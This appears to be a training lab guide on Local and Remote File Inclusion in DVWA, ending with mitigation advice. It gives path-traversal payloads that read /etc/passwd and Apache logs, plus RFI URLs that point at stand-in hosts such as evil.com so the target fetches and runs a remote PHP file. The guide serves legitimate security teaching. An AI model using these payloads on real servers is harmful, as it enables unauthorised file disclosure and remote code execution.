# File Inclusion Lab

## Overview
This lab demonstrates **File Inclusion vulnerabilities** in a web application. File Inclusion occurs when an application allows user input to determine which file is loaded, without proper validation.  

Attackers can exploit this to:
- Access sensitive files on the server (**Local File Inclusion – LFI**).  
- Include and execute remote files from external sources (**Remote File Inclusion – RFI**).  

---

## Objective
- Understand **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)**.  
- Exploit input fields to view sensitive files like `/etc/passwd` or configuration files.  
- Learn how path traversal works using `../` sequences.

---

## Types of File Inclusion

### 1. Local File Inclusion (LFI)
- Occurs when the application loads files from the **local server**.  
- Example URL parameter:

```

[http://example.com/index.php?page=home.php](http://example.com/index.php?page=home.php)

```

- By manipulating `page` with path traversal:

```

[http://example.com/index.php?page=../../../../etc/passwd](http://example.com/index.php?page=../../../../etc/passwd)

```

- You can access sensitive server files.  

---

### 2. Remote File Inclusion (RFI)
- Occurs when the application loads files from **remote servers**.  
- Example:

```

[http://example.com/index.php?page=http://evil.com/malicious.php](http://example.com/index.php?page=http://evil.com/malicious.php)

````

- The remote file can execute **malicious code** on the target server.  
- Very dangerous and often leads to full server compromise.

---

## Steps to Exploit LFI

1. Open the lab environment (DVWA or local web app).  
2. Set **Security Level → Low**.  
3. Navigate to **File Inclusion module**.  
4. Inspect the URL or input fields for file parameters (e.g., `file`, `page`, `document`).  
5. Try accessing **sensitive files**:

```text
../../../../etc/passwd
../../../../var/log/apache2/access.log
````

6. Repeat path traversal (`../`) until reaching the **root directory** if needed.
7. Observe output to extract information from the server.

---

## Steps to Exploit RFI

1. Host a malicious PHP file on your server:

```php
<?php
  echo "Remote code executed!";
?>
```

2. Inject the URL of your file in the vulnerable parameter:

```
http://target.com/index.php?page=http://yourserver.com/malicious.php
```

3. The target server will fetch and execute the remote file.

---

## Security Notes

* LFI/RFI vulnerabilities exist when user input is **not sanitized**.
* Always test in **controlled lab environments**.
* RFI is more dangerous than LFI as it allows **remote code execution**.

---

## Mitigation

1. **Input validation**: Only allow specific files or directories.
2. **Disable URL inclusion**: Prevent fetching remote files via `include()` or `require()`.
3. **Use whitelisting**: Maintain a list of allowed files.
4. **Restrict server permissions**: Limit web application access to sensitive directories.

---

## References

* [OWASP File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)
* DVWA Documentation

